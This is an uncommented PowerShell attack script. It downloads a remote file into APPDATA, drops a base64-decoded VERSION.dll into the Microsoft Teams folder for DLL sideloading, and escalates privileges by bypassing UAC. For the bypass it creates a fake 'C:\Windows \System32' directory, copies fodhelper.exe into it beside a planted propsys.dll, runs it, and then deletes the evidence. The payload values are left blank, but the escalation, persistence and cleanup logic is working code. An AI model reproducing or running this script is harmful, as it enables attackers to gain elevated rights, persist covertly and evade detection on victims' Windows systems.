
$basePropsys = ''
$baseVersionDll = ''
$url = '<url to image>'
function Get-ShellImage($url,$baseVersionDll)
{
    $path = "$env:APPDATA\P16700.png"
    if(([System.IO.File]::Exists($path)) -eq $false)
    {
        Invoke-WebRequest -uri $url -OutFile $path
        write-dllShell -basedll $baseVersionDll
    }
}

function write-dllShell($basedll)
{   
    $path =  "$env:LOCALAPPDATA\Microsoft\Teams\current\VERSION.dll"
    if(([System.IO.File]::Exists($path)) -eq $false)
    {
        [byte[]]$Bytes = [convert]::FromBase64String($basedll)
        [System.IO.File]::WriteAllBytes($path,$Bytes)
    }
}


function escalate($basedll) {
    [System.IO.Directory]::CreateDirectory("\\?\C:\Windows ")
    [System.IO.Directory]::CreateDirectory("\\?\C:\Windows \System32")
    copy "C:\Windows\System32\fodhelper.exe" "C:\Windows \System32\"
    [System.IO.File]::WriteAllBytes(
        "C:\Windows \System32\propsys.dll",
         [System.Convert]::FromBase64String($basedll)
    )
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = "C:\Windows \System32\fodhelper.exe"
    $process.Start()
    $process.WaitForExit(1000)
    $files = (Get-ChildItem -Path "C:\Windows \System32\").FullName
    foreach($i in $files){
        [System.IO.File]::Delete($i)
    }
    [System.IO.Directory]::Delete("C:\Windows \System32\", $true)
    [System.IO.Directory]::Delete("C:\Windows \", $true)
}

Get-ShellImage -url $url -baseVersionDll $baseVersionDll
escalate -basedll $basePropsys
